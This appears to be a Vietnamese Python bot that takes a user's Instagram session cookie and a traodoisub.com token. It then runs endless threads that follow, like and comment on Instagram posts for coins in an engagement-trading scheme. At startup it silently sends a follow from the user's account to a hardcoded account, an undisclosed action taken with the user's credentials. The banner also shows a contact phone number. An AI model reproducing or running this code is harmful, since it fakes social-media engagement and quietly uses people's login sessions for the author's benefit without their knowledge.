import requests
from time import sleep
import threading
import os
from os import system
system('cls')
#
logo='''
 _____     ______     ______     __         __     __   __     ______    
/\  __-.  /\  __ \   /\  == \   /\ \       /\ \   /\ "-.\ \   /\  ___\   
\ \ \/\ \ \ \  __ \  \ \  __<   \ \ \____  \ \ \  \ \ \-.  \  \ \ \__ \  
 \ \____-  \ \_\ \_\  \ \_\ \_\  \ \_____\  \ \_\  \ \_\\"\_\  \ \_____\ 
  \/____/   \/_/\/_/   \/_/ /_/   \/_____/   \/_/   \/_/ \/_/   \/_____/ 
========================================================================
TOOL ĐANG DEMO NHÉ ANH EM =))                                                                         
CÓ LỖI IB ZALO: 0372760208
BẢN QUYỀN: DARLING FROM NOBLETEAM
'''

#
print(logo)
token=input('NHẬP TOKEN TRAODOISUB: ')
sleep(0.5)
system('cls')
print(logo)
cookie=input('NHẬP COOKIE INSTAGRAM: ')
sleep(0.5)
system('cls')
print(logo)
csrftoken=cookie.split('csrftoken=')[1].split(';')[0]
ds_user_id=cookie.split('ds_user_id=')[1].split(';')[0]
#
headers_admin = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'vi,en;q=0.9,vi-VN;q=0.8,fr-FR;q=0.7,fr;q=0.6,en-US;q=0.5',
    # 'content-length': '0',
    'content-type': 'application/x-www-form-urlencoded',
    # Requests sorts cookies= alphabetically
    'cookie': cookie,
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/quang722008/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'viewport-width': '825',
    'x-csrftoken': csrftoken,
    'x-requested-with': 'XMLHttpRequest',
}
fl_admin = requests.post(f'https://www.instagram.com/web/friendships/54204123723follow/',headers=headers_admin)
#

login=requests.get(f'https://traodoisub.com/api/?fields=profile&access_token={token}').json()
if 'success' in login:
	name=login['data']['user']
	xu=login['data']['xu']
	print(f'TÀI KHOẢN TRAODOISUB: {name} | TỔNG XU: {xu}')
else:
	print('TOKEN KHÔNG HỢP LỆ!')
sleep(1)
#
cauhinh=requests.get(f'https://traodoisub.com/api/?fields=instagram_run&id={ds_user_id}&access_token={token}').json()
print(cauhinh)
sleep(1)
#
def fl():
	while True:
		try:
			job=requests.get(f'https://traodoisub.com/api/?fields=instagram_follow&access_token={token}').json()
			id=job['data'][0]['id']
			idjob=id.split('_')[0]
			link=job['data'][0]['link']
			#
			headers = {
			    'authority': 'www.instagram.com',
			    'accept': '*/*',
			    'accept-language': 'vi,en;q=0.9,vi-VN;q=0.8,fr-FR;q=0.7,fr;q=0.6,en-US;q=0.5',
			    # 'content-length': '0',
			    'content-type': 'application/x-www-form-urlencoded',
			    # Requests sorts cookies= alphabetically
			    'cookie': cookie,
			    'origin': 'https://www.instagram.com',
			    'referer': link,
			    'sec-ch-prefers-color-scheme': 'dark',
			    'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
			    'sec-ch-ua-mobile': '?0',
			    'sec-ch-ua-platform': '"Windows"',
			    'sec-fetch-dest': 'empty',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-site': 'same-origin',
			    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
			    'viewport-width': '825',
			    'x-csrftoken': csrftoken,
			    'x-requested-with': 'XMLHttpRequest',
			}

			response = requests.post(f'https://www.instagram.com/web/friendships/{idjob}follow/',headers=headers)
			sleep(2)
			duyet=requests.get(f'https://traodoisub.com/api/coin/?type=INS_FOLLOW_CACHE&id={id}&access_token={token}').json()
			nhan=duyet['data']['msg']
			tong=duyet['data']['pending']
			print(f'FOLLOW {idjob} | NHẬN {nhan} | TỔNG XU ĐỢI DUYỆT {tong}')
			sleep(10)
		except:
			for i in range(5,-1,-1):
				print(f'[DARLING]  FINDING JOB [|] ',end='\r')
				sleep(0.2)
				print(f'[DARLING]  FINDING JOB [/] ',end='\r')
				sleep(0.2)
				print(f'[DARLING]  FINDING JOB [-] ',end='\r')
				sleep(0.2)
				print(f'[DARLING]  FINDING JOB [\] ',end='\r')
				sleep(0.2)
				print(f'[DARLING]  FINDING JOB [|] ',end='\r')
				sleep(0.2)
			continue
#
def like():
	while True:
		try:
			joblike=requests.get(f'https://traodoisub.com/api/?fields=instagram_like&access_token={token}').json()
			idlike=joblike['data'][0]['id']
			link=joblike['data'][0]['link']
			idjob=idlike.split('_')[0]
			headers = {
			    'authority': 'www.instagram.com',
			    'accept': '*/*',
			    'accept-language': 'vi,en;q=0.9,vi-VN;q=0.8,fr-FR;q=0.7,fr;q=0.6,en-US;q=0.5',
			    # 'content-length': '0',
			    'content-type': 'application/x-www-form-urlencoded',
			    # Requests sorts cookies= alphabetically
			    'cookie': cookie,
			    'origin': 'https://www.instagram.com',
			    'referer': link,
			    'sec-ch-prefers-color-scheme': 'dark',
			    'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
			    'sec-ch-ua-mobile': '?0',
			    'sec-ch-ua-platform': '"Windows"',
			    'sec-fetch-dest': 'empty',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-site': 'same-origin',
			    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
			    'viewport-width': '640',
			    #'x-asbd-id': '198387',
			    'x-csrftoken': csrftoken,
			}

			response = requests.post(f'https://www.instagram.com/web/likes/{idjob}/like/', headers=headers)
			sleep(1)
			duyet=requests.get(f'https://traodoisub.com/api/coin/?type=INS_LIKE_CACHE&id={idlike}&access_token={token}').json()
			nhan=duyet['data']['msg']
			tong=duyet['data']['pending']
			print(f'LIKE {idjob} | NHẬN {nhan} | TỔNG XU ĐỢI DUYỆT {tong}')
			sleep(10)
		except:
			for i in range(5,-1,-1):
				print(f'[DARLING]  FINDING JOB [|] ',end='\r')
				sleep(0.2)
				print(f'[DARLING]  FINDING JOB [/] ',end='\r')
				sleep(0.2)
				print(f'[DARLING]  FINDING JOB [-] ',end='\r')
				sleep(0.2)
				print(f'[DARLING]  FINDING JOB [\] ',end='\r')
				sleep(0.2)
				print(f'[DARLING]  FINDING JOB [|] ',end='\r')
				sleep(0.2)
			continue
def cmt():
	while True:
		try:
			jobcmt=requests.get(f'https://traodoisub.com/api/?fields=instagram_comment&access_token={token}').json()
			id=jobcmt['data'][0]['id']
			link=jobcmt['data'][0]['link']
			nd=jobcmt['data'][0]['noidung']
			idjob=id.split('_')[0]
			headers = {
			    'authority': 'www.instagram.com',
			    'accept': '*/*',
			    'accept-language': 'vi,en;q=0.9,vi-VN;q=0.8,fr-FR;q=0.7,fr;q=0.6,en-US;q=0.5',
			    # Requests sorts cookies= alphabetically
			    'cookie': cookie,
			    'origin': 'https://www.instagram.com',
			    'referer': link,
			    'sec-ch-prefers-color-scheme': 'dark',
			    'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
			    'sec-ch-ua-mobile': '?0',
			    'sec-ch-ua-platform': '"Windows"',
			    'sec-fetch-dest': 'empty',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-site': 'same-origin',
			    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
			    'viewport-width': '640',
			    #'x-asbd-id': '198387',
			    'x-csrftoken': csrftoken
			}

			data = {
			    'comment_text': nd,
			    'replied_to_comment_id': '',
			}

			response = requests.post(f'https://www.instagram.com/web/comments/{idjob}/add/',headers=headers, data=data)
			sleep(1)
			duyet=requests.get(f'https://traodoisub.com/api/coin/?type=INS_COMMENT_CACHE&id={id}&access_token={token}').json()
			nhan=duyet['data']['msg']
			tong=duyet['data']['pending']
			print(f'COMMENT {idjob} | NHẬN {nhan} | TỔNG XU ĐỢI DUYỆT {tong}')
			sleep(10)
		except:
			for i in range(5,-1,-1):
				print(f'[DARLING] FINDING JOB [|] ',end='\r')
				sleep(0.2)
				print(f'[DARLING] FINDING JOB [/] ',end='\r')
				sleep(0.2)
				print(f'[DARLING] FINDING JOB [-] ',end='\r')
				sleep(0.2)
				print(f'[DARLING] FINDING JOB [\] ',end='\r')
				sleep(0.2)
				print(f'[DARLING] FINDING JOB [|] ',end='\r')
				sleep(0.2)
			continue
def likecmt():
	while True:
		try:
			job=requests.get(f'https://traodoisub.com/api/?fields=instagram_likecmt&access_token={token}').json()
			id=job['data'][0]['id']
			link=job['data'][0]['link_mobile']
			idjob=id.split('_')[0]
			headers = {
				    'authority': 'www.instagram.com',
				    'accept': '*/*',
				    'accept-language': 'vi,en;q=0.9,vi-VN;q=0.8,fr-FR;q=0.7,fr;q=0.6,en-US;q=0.5',
				    # 'content-length': '0',
				    'content-type': 'application/x-www-form-urlencoded',
				    # Requests sorts cookies= alphabetically
				    'cookie': cookie,
				    'origin': 'https://www.instagram.com',
				    'referer': link,
				    'sec-ch-prefers-color-scheme': 'dark',
				    'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
				    'sec-ch-ua-mobile': '?0',
				    'sec-ch-ua-platform': '"Windows"',
				    'sec-fetch-dest': 'empty',
				    'sec-fetch-mode': 'cors',
				    'sec-fetch-site': 'same-origin',
				    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
				    'viewport-width': '882',
				    #'x-asbd-id': '198387',
				    'x-csrftoken': csrftoken,

			}

			response = requests.post(f'https://www.instagram.com/web/comments/like/{idjob}/',headers=headers)
			sleep(1)
			duyet=requests.get(f'https://traodoisub.com/api/coin/?type=INS_LIKECMT_CACHE&id={id}&access_token={token}').json()
			nhan=duyet['data']['msg']
			tong=duyet['data']['pending']
			print(f'LIKE COMMENT {idjob} | NHẬN {nhan} | TỔNG XU ĐỢI DUYỆT {tong}')
			sleep(8)
		except:
			for i in range(5,-1,-1):
				print(f'[DARLING] FINDING JOB [|] ',end='\r')
				sleep(0.2)
				print(f'[DARLING] FINDING JOB [/] ',end='\r')
				sleep(0.2)
				print(f'[DARLING] FINDING JOB [-] ',end='\r')
				sleep(0.2)
				print(f'[DARLING] FINDING JOB [\] ',end='\r')
				sleep(0.2)
				print(f'[DARLING] FINDING JOB [|] ',end='\r')
				sleep(0.2)
			continue

TFL=threading.Thread(target=fl)
TL=threading.Thread(target=like)
TC=threading.Thread(target=cmt)
TLC=threading.Thread(target=likecmt)
TFL.start()
TL.start()
TC.start()
TLC.start()
